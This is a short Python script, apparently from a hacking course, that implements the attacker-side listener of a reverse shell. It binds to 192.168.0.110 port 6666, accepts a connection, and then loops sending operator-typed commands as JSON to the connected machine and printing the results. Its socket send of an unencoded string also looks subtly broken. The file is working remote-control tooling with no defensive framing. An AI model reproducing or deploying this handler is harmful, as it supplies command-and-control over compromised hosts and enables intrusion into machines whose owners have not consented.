import socket
import json

class SocketListener:
	def __init__(self,ip,port):
		my_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		my_listener.bind((ip,port))
		my_listener.listen(0)
		print("Listening... ")
		(self.my_connection,my_addr) = my_listener.accept()
		print("Connected to " + str(my_addr))

	def json_send(self,data):
		json_data = json.dumps(data)
		#json_data = json_data.decode()
		self.my_connection.send(json_data)

	def json_receive(self):
		json_data = self.my_connection.recv(1024)
		obj_rec = json.loads(json_data)
		return obj_rec


	def command_output_receiver(self,command_input):
		self.json_send(command_input)
		output = self.json_receive()
		#output = output.decode()
		return output

	def command_execution(self):
		while True:
			command_input = input("Enter a command :")
			command_output = self.command_output_receiver(command_input)
			print(command_output)

Socket_listener = SocketListener("192.168.0.110",6666)
Socket_listener.command_execution()